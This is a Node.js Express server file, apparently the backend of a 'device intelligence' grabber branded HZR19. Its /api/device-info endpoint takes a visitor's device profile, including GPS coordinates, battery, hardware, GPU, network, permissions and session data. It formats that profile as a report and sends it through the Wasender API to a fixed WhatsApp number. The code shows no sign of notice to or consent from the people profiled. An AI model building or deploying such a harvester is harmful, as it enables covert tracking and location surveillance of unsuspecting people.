const express = require("express");
const path = require("path");

const app = express();

const PORT = process.env.PORT || 10000;

const WASENDER_TOKEN = process.env.WASENDER_TOKEN;
const WHATSAPP_TO = process.env.WHATSAPP_TO;

app.use(express.json({ limit: "100kb" }));
app.use(express.static(__dirname));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/api/device-info", async (req, res) => {
    try {
        if (!WASENDER_TOKEN || !WHATSAPP_TO) {
            return res.status(500).json({
                success: false,
                error: "WhatsApp configuration is missing."
            });
        }

        const data = req.body;

        if (!data || typeof data !== "object") {
            return res.status(400).json({
                success: false,
                error: "Invalid request."
            });
        }

        const message = buildWhatsAppMessage(data);

        const response = await fetch(
            "https://api.wasender.dev/messages/text",
            {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${WASENDER_TOKEN}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    to: WHATSAPP_TO,
                    body: message
                })
            }
        );

        const result = await response.json();

        if (!response.ok) {
            console.error("Wasender error:", result);

            return res.status(502).json({
                success: false,
                error: "WhatsApp service rejected the message."
            });
        }

        return res.json({
            success: true,
            sent: true
        });

    } catch (error) {
        console.error("Server error:", error);

        return res.status(500).json({
            success: false,
            error: "Internal server error."
        });
    }
});


/* =========================================================
   HELPERS
   ========================================================= */

function value(input, fallback = "Unavailable") {
    if (
        input === undefined ||
        input === null ||
        input === ""
    ) {
        return fallback;
    }

    return input;
}


function yesNo(input) {
    if (input === true) return "YES";
    if (input === false) return "NO";

    return "UNKNOWN";
}


function formatLocation(location) {

    if (!location) {
        return "Unavailable";
    }

    if (location.permission !== "granted") {
        return [
            `Permission  : ${value(location.permission)}`
        ].join("\n");
    }

    return [
        "Permission  : GRANTED",
        `Latitude    : ${value(location.latitude)}`,
        `Longitude   : ${value(location.longitude)}`,
        `Accuracy    : ${value(location.accuracy)} m`,
        `Altitude    : ${value(location.altitude)}`,
        `Heading     : ${value(location.heading)}`,
        `Speed       : ${value(location.speed)}`
    ].join("\n");
}


function formatCapabilities(capabilities) {

    if (
        !capabilities ||
        typeof capabilities !== "object"
    ) {
        return "Unavailable";
    }

    return Object.entries(capabilities)
        .map(([key, val]) => {
            return `│ ${key.padEnd(16, " ")}: ${yesNo(val)}`;
        })
        .join("\n");
}


function formatPermissions(permissions) {

    if (
        !permissions ||
        typeof permissions !== "object"
    ) {
        return "Unavailable";
    }

    return Object.entries(permissions)
        .map(([key, val]) => {
            return `│ ${key.padEnd(16, " ")}: ${value(val)}`;
        })
        .join("\n");
}


/* =========================================================
   WHATSAPP REPORT
   ========================================================= */

function buildWhatsAppMessage(data) {

    const device =
        data.device || {};

    const os =
        data.operatingSystem || {};

    const browser =
        data.browser || {};

    const hardware =
        data.hardware || {};

    const display =
        data.display || {};

    const network =
        data.network || {};

    const battery =
        data.battery || {};

    const storage =
        data.storage || {};

    const storageEstimate =
        data.storageEstimate || {};

    const webPlatform =
        data.webPlatform || {};

    const capabilities =
        data.capabilities || {};

    const graphics =
        data.graphics || {};

    const permissions =
        data.permissions || {};

    const preferences =
        data.preferences || {};

    const locale =
        data.locale || {};

    const session =
        data.session || {};

    const page =
        data.page || {};

    const media =
        data.media || {};


    const reportId =
        session.id
            ? session.id.substring(0, 8).toUpperCase()
            : "UNKNOWN";


    return [
        "╔══════════════════════════════╗",
        "        𝕳𝖅𝕽𝟏⁹",
        "     DEVICE INTELLIGENCE",
        "╚══════════════════════════════╝",

        "",

        "[ SYSTEM ]",
        `Status      : ONLINE`,
        `Report      : #HZR-${reportId}`,
        `Timestamp   : ${value(data.entryTime)}`,

        "",

        "┌─ SYSTEM ─────────────────────┐",
        `│ OS         : ${value(
            extractOS(os, browser.userAgent)
        )}`,
        `│ Platform   : ${value(os.platform)}`,
        `│ CPU        : ${value(hardware.cpuCores)}`,
        `│ Memory     : ${
            hardware.ramGB
                ? hardware.ramGB + " GB"
                : "Unavailable"
        }`,
        `│ Device     : ${value(device.type)}`,
        `│ Touch      : ${yesNo(device.touch)}`,
        "└──────────────────────────────┘",

        "",

        "┌─ DEVICE ─────────────────────┐",
        `│ Brand      : ${value(device.brand, "")}`,
        `│ Model      : ${value(device.model, "")}`,
        `│ Manufacturer: ${value(
            device.manufacturer,
            ""
        )}`,
        `│ Mobile     : ${yesNo(device.mobile)}`,
        `│ Touch Pts  : ${value(
            device.maxTouchPoints
        )}`,
        "└──────────────────────────────┘",

        "",

        "┌─ BROWSER ────────────────────┐",
        `│ Browser    : ${value(browser.name)}`,
        `│ Language   : ${value(browser.language)}`,
        `│ Cookies    : ${yesNo(
            browser.cookiesEnabled
        )}`,
        `│ DNT        : ${value(
            browser.doNotTrack
        )}`,
        `│ Online     : ${yesNo(browser.online)}`,
        "└──────────────────────────────┘",

        "",

        "┌─ DISPLAY ────────────────────┐",
        `│ Resolution : ${
            value(display.screenWidth)
        } × ${
            value(display.screenHeight)
        }`,
        `│ Available  : ${
            value(display.availableWidth)
        } × ${
            value(display.availableHeight)
        }`,
        `│ Viewport   : ${
            value(display.viewportWidth)
        } × ${
            value(display.viewportHeight)
        }`,
        `│ Pixel Ratio: ${value(display.pixelRatio)}`,
        `│ Color Depth: ${value(display.colorDepth)}`,
        `│ Orientation: ${value(display.orientation)}`,
        "└──────────────────────────────┘",

        "",

        "┌─ NETWORK ────────────────────┐",
        `│ Status     : ${yesNo(browser.online)}`,
        `│ Type       : ${value(network.type)}`,
        `│ Effective  : ${value(
            network.effectiveType
        )}`,
        `│ Downlink   : ${value(
            network.downlink
        )}`,
        `│ RTT        : ${value(network.rtt)}`,
        `│ Save Data  : ${yesNo(
            network.saveData
        )}`,
        "└──────────────────────────────┘",

        "",

        "┌─ BATTERY ────────────────────┐",
        `│ Level      : ${
            battery.supported
                ? value(battery.level) + "%"
                : "Unavailable"
        }`,
        `│ Charging   : ${
            battery.supported
                ? yesNo(battery.charging)
                : "Unavailable"
        }`,
        `│ Charge Time: ${value(
            battery.chargingTime
        )}`,
        `│ Discharge  : ${value(
            battery.dischargingTime
        )}`,
        "└──────────────────────────────┘",

        "",

        "┌─ LOCATION ───────────────────┐",
        formatLocation(data.location)
            .split("\n")
            .map(line => `│ ${line}`)
            .join("\n"),
        "└──────────────────────────────┘",

        "",

        "┌─ STORAGE ─────────────────────┐",
        `│ LocalStorage : ${yesNo(
            storage.localStorage
        )}`,
        `│ SessionStore : ${yesNo(
            storage.sessionStorage
        )}`,
        `│ IndexedDB    : ${yesNo(
            storage.indexedDB
        )}`,
        `│ Cache API    : ${yesNo(
            storage.cacheAPI
        )}`,
        `│ Storage API  : ${yesNo(
            storage.storageManager
        )}`,
        `│ Usage        : ${formatBytes(
            storageEstimate.usage
        )}`,
        `│ Quota        : ${formatBytes(
            storageEstimate.quota
        )}`,
        "└──────────────────────────────┘",

        "",

        "┌─ GRAPHICS ───────────────────┐",
        `│ Supported  : ${yesNo(
            graphics.supported
        )}`,
        `│ Vendor     : ${value(
            graphics.vendor
        )}`,
        `│ Renderer   : ${value(
            graphics.renderer
        )}`,
        `│ WebGL      : ${value(
            graphics.version
        )}`,
        `│ GLSL       : ${value(
            graphics.shadingLanguage
        )}`,
        `│ Texture    : ${value(
            graphics.maxTextureSize
        )}`,
        "└──────────────────────────────┘",

        "",

        "┌─ CAPABILITIES ───────────────┐",
        formatCapabilities(capabilities),
        "└──────────────────────────────┘",

        "",

        "┌─ PERMISSIONS ────────────────┐",
        formatPermissions(permissions),
        "└──────────────────────────────┘",

        "",

        "┌─ LOCALE ─────────────────────┐",
        `│ Language   : ${value(
            locale.language
        )}`,
        `│ Timezone   : ${value(
            locale.timezone
        )}`,
        "└──────────────────────────────┘",

        "",

        "┌─ WEB PLATFORM ───────────────┐",
        `│ HTTPS      : ${yesNo(
            webPlatform.https
        )}`,
        `│ Secure     : ${yesNo(
            webPlatform.secureContext
        )}`,
        `│ Visibility : ${value(
            webPlatform.visibility
        )}`,
        `│ Focused    : ${yesNo(
            webPlatform.focused
        )}`,
        "└──────────────────────────────┘",

        "",

        "┌─ SESSION ────────────────────┐",
        `│ ID         : ${value(session.id)}`,
        `│ Generated  : ${value(
            session.generatedAt
        )}`,
        "└──────────────────────────────┘",

        "",

        "────────────────────────────────",
        "          𝕳𝖅𝕽𝟏⁹",
        "       DEVICE CENTER",
        "────────────────────────────────"
    ].join("\n");
}


/* =========================================================
   OS DETECTION
   ========================================================= */

function extractOS(os, userAgent) {

    const ua = userAgent || "";

    if (/Android/i.test(ua)) {

        const match =
            ua.match(/Android\s+([0-9.]+)/i);

        return match
            ? `Android ${match[1]}`
            : "Android";
    }

    if (/iPhone|iPad|iPod/i.test(ua)) {
        return "iOS";
    }

    if (/Windows/i.test(ua)) {
        return "Windows";
    }

    if (/Mac OS X/i.test(ua)) {
        return "macOS";
    }

    if (/Linux/i.test(ua)) {
        return "Linux";
    }

    return value(os.platform);
}


/* =========================================================
   STORAGE FORMAT
   ========================================================= */

function formatBytes(bytes) {

    if (
        bytes === undefined ||
        bytes === null ||
        isNaN(bytes)
    ) {
        return "Unavailable";
    }

    if (bytes < 1024) {
        return `${bytes} B`;
    }

    if (bytes < 1024 * 1024) {
        return `${(bytes / 1024).toFixed(1)} KB`;
    }

    if (bytes < 1024 * 1024 * 1024) {
        return `${(
            bytes /
            (1024 * 1024)
        ).toFixed(1)} MB`;
    }

    return `${(
        bytes /
        (1024 * 1024 * 1024)
    ).toFixed(2)} GB`;
}


/* =========================================================
   SERVER
   ========================================================= */

app.listen(
    PORT,
    "0.0.0.0",
    () => {
        console.log(
            `HZR server running on port ${PORT}`
        );
    }
);
